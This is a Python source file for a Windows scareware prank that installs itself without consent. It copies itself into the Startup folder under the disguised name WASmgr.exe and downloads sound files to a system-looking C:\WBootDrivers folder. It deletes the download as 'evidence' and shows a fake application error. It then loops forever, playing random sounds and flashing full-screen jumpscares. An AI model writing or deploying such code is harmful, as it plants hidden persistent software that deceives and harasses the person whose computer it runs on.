import os
import urllib.request
import keyboard
import shutil
from tkinter import messagebox, Tk
import zipfile
from playsound import playsound
from time import sleep
import random
import threading
import sys

def getforceddir():
    return os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    
def isalreadyrooted():
    if os.path.isfile(getforceddir()+"\\WASmgr.exe"):
        return True
    else:
        return False

def writeforcefir():
    shutil.copy(sys.argv[0],getforceddir()+"\\WASmgr.exe")

def install():
    print("Program NOT installed. Installing.")
    print("Copying data")
    writeforcefir()
    print("Downloading")
    urllib.request.urlretrieve("https://github.com/Enderbyte-Programs/Other/raw/main/JSoundAssets.zip",".assets.zip")
    try:
        os.mkdir("C:\\WBootDrivers")
    except:
        pass
    print("Extracting")
    with zipfile.ZipFile(".assets.zip","r") as zf:
        zf.extractall("C:\\WBootDrivers")
    print("Rmoving evidence")
    os.remove(".assets.zip")

def playjumpscare():
    playsound("C:\\WBootDrivers\\SysSoundStart1.mp3")

def jumpscare():
    print("JUMPSCARE")
    root = Tk()
    root.attributes("-fullscreen",True)
    root.wm_attributes("-topmost",True)
    threading.Thread(target=playjumpscare).start()
    for i in range(10):
    
        root["bg"] = "black"
        root.update()
        sleep(0.1)
        root["bg"] = "white"
        root.update()
        sleep(0.1)
        root["bg"] = "red"
        root.update()    
        sleep(0.1)
    root.destroy()
    del root

def rjumptimer():
    print("Beginning The Pain")
    while True:
        sleep(random.randint(60,600))#REMOVE /10 BEFORE DISTROBUTION
        print("Doing stuff")
        playsound(random.choice(["C:\\WBootDrivers\\AudioCore.mp3","C:\\WBootDrivers\\WSSBoot.mp3"]))
        if random.randint(3,5) == 5:
            jumpscare()

def main():
    installed = isalreadyrooted()
    if installed and os.path.isdir("C:\\WBootDrivers"):
        print("Program is already installed")
    else:
        install()
        __r = Tk()
        __r.withdraw()
        messagebox.showerror("Application Error","An error occured in your application.")
        
    
    rjumptimer()
    
main()